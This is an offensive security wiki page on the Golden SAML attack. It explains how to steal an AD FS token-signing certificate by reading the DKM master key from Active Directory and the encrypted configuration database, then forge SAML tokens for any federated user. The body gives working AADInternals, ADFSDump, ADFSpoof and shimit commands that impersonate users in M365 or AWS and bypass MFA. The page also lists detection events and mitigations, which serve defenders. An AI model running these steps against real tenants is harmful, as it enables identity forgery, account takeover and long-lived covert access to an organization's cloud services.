---
title: Golden SAML
category: AD / Entra ID
order: 80
tags:
  - golden-saml
  - adfs
  - federation
  - saml
  - token-signing
  - dkm
  - aadinternals
  - adfsdump
  - adfspoof
  - shimit
  - persistence
summary: Steal the AD FS token-signing certificate (plus the DKM master key that encrypts it) to forge arbitrary SAML responses and impersonate any federated user to Entra ID / M365 and other SAML apps — bypassing passwords and MFA. The cloud analogue of a Golden Ticket.
prerequisites:
  - The AD FS token-signing certificate private key, obtained either by (a) local access on the primary AD FS server as the AD FS service account/SYSTEM, or (b) the AD FS config DB + the DKM master key read from AD
  - "The DKM master key: stored as an attribute (thumbnailPhoto) of a contact object inside the AD FS DKM container in AD — readable by the AD FS service account or a Domain Admin"
  - The federation service Identifier / issuer URI (Get-AdfsProperties | Select Identifier)
  - The target's ImmutableID (base64 of the on-prem objectGUID) for the user you want to impersonate
tools:
  - AADInternals
  - mandiant/ADFSDump
  - mandiant/ADFSpoof
  - cyberark/shimit
  - mimikatz
detection:
  - Event 4662 read access to the AD FS DKM contact object / its thumbnailPhoto attribute by a non-AD FS principal
  - PowerShell 4104 script-block logging matching AADInternals / ADFSDump / ADFSpoof; Sysmon named-pipe access to \\.\pipe\MICROSOFT##WID\tsql\query from a non-AD FS process
  - AD FS 1200/1202 token-issuance events with no correlating 4624/4625, or Entra federated sign-ins with no matching on-prem AD FS event
  - "Entra sign-in logs: federated sign-in with MFA satisfied by inbound claim, anomalous IP, or token lifetime that does not match AD FS policy"
  - A second/unexpected token-signing certificate added to the federation config (stealthy persistence)
mitigation:
  - Treat AD FS servers, the AD FS service account, and the DKM container as Tier-0; tightly restrict who can read the DKM key
  - If a token-signing cert may be exposed, rotate it TWICE (Update-AdfsCertificate) and re-establish federation trust; keep short cert lifetimes / auto-rollover
  - Migrate off AD FS to cloud authentication (PHS/PTA) + Entra Conditional Access; decommission unused federation
  - Enable Entra Connect Health for AD FS and alert on new token-signing certificates; require MFA enforced in the cloud (Conditional Access), not only claims from the IdP
refs:
  - label: "AADInternals — Exporting AD FS certificates: TTPs"
    url: https://aadinternals.com/post/adfs/
  - label: Mandiant — ADFSDump (repo)
    url: https://github.com/mandiant/ADFSDump
  - label: Mandiant — ADFSpoof (repo)
    url: https://github.com/mandiant/ADFSpoof
  - label: CyberArk — shimit (Golden SAML PoC, repo)
    url: https://github.com/cyberark/shimit
  - label: Sygnia — Detection and hunting of Golden SAML
    url: https://www.sygnia.co/threat-reports-and-advisories/golden-saml-attack/
  - label: Threat Hunter Playbook — AD FS DKM keys
    url: https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html
  - label: SimuLand — Export AD FS certificates via the DKM master key
    url: https://simulandlabs.com/labs/GoldenSAML/simulation/export-adfs-certificates/exportADFSCertsDKMKey.html
  - label: Tenable TechBlog (C. Notin) — persistence via the secondary token-signing certificate
    url: https://medium.com/tenable-techblog/stealthy-persistence-privesc-in-entra-id-by-using-the-federated-auth-secondary-token-signing-cert-876b21261106
---

## What it is

AD FS proves a user's identity to relying parties (Entra ID, M365, and any SAML/WS-Fed app) by **signing a SAML response** with its **token-signing certificate**. Anyone holding that private key can mint a valid token for **any user, with any claims (including an MFA-satisfied claim), for any federated app** — no password, no MFA prompt, no touching the target account. This is *Golden SAML* (CyberArk, 2017; weaponised at scale by UNC2452/APT29 in the 2020 SolarWinds intrusions).

It is persistence as much as access: the token-signing cert is long-lived, so a stolen key keeps working until the cert is rotated (twice).

## The two secrets you need

AD FS stores the token-signing certificate **encrypted** in its configuration database (Windows Internal Database / SQL). The encryption key is the **DKM (Distributed Key Manager) master key**, which lives in AD — as the `thumbnailPhoto` attribute of a contact object inside the AD FS DKM container (`CN=<guid>,CN=ADFS,CN=Microsoft,CN=Program Data,DC=$domain...`). So to export the signing cert you need **both**:

1. **AD FS configuration data** (the encrypted cert blob) — read from WID via the named pipe `\\.\pipe\MICROSOFT##WID\tsql\query`, or from SQL.
2. **The DKM master key** — read from the AD contact object.

On the **primary AD FS server**, running as the AD FS service account, tooling reads both in one shot. Remotely, a Domain Admin can read the DKM key from AD and the config from the DB without ever logging into the AD FS box.

## Export the token-signing certificate

**AADInternals** (on the AD FS server, or remotely with config+key):

```powershell
# On the primary AD FS server (as the AD FS service account / SYSTEM)
Export-AADIntADFSSigningCertificate            # -> .\ADFSSigningCertificate.pfx (blank password)

# Remote export: supply the AD FS config + DKM key you pulled from AD
Export-AADIntADFSCertificates -Configuration $config -Key $dkmKey
```

**Mandiant chain** (`ADFSDump` to extract, `ADFSpoof` to forge):

```sh
# On the AD FS server, running as the AD FS service account
ADFSDump.exe        # dumps token-signing key material + config from WID + DKM
```

## Forge and use a token

**AADInternals** — impersonate a user straight into M365:

```powershell
# Open a session as the target (ImmutableID = base64 of their on-prem objectGUID)
Open-AADIntOffice365Portal -ImmutableID <target-immutableid> \
  -Issuer "http://$domain/adfs/services/trust" \
  -PfxFileName .\ADFSSigningCertificate.pfx -Verbose

# Or mint a raw SAML token (default validity ~1h) to feed elsewhere
New-AADIntSAMLToken -ImmutableID <target-immutableid> \
  -Issuer "http://$domain/adfs/services/trust" -PfxFileName .\ADFSSigningCertificate.pfx
```

**ADFSpoof** (offline forge from the ADFSDump output):

```sh
python ADFSpoof.py -b EncryptedPfx.bin IdP-signing-key.txt saml2 \
  --endpoint https://<sp>/saml --nameid $upn --assertions '<...claims...>'
```

**shimit** (CyberArk PoC — note this example targets **AWS** IAM, not Entra; use AADInternals for M365):

```sh
python shimit.py -idp http://adfs.$domain/adfs/services/trust \
  -pk key.pem -c cert.pem -u '$domain\$user' -n $upn -r <aws-role> -id <aws-account-id>
```

## Related persistence

Adding a **second token-signing certificate** to the federation config (rather than stealing the first) is a quieter variant — the attacker's cert signs valid tokens and blends with legitimate rollover. See the Tenable research below. Forging federation from the **cloud side** (turning a managed domain federated with an attacker issuer) is the *federation backdoor* covered in **On-Prem -> Cloud Pivoting**.
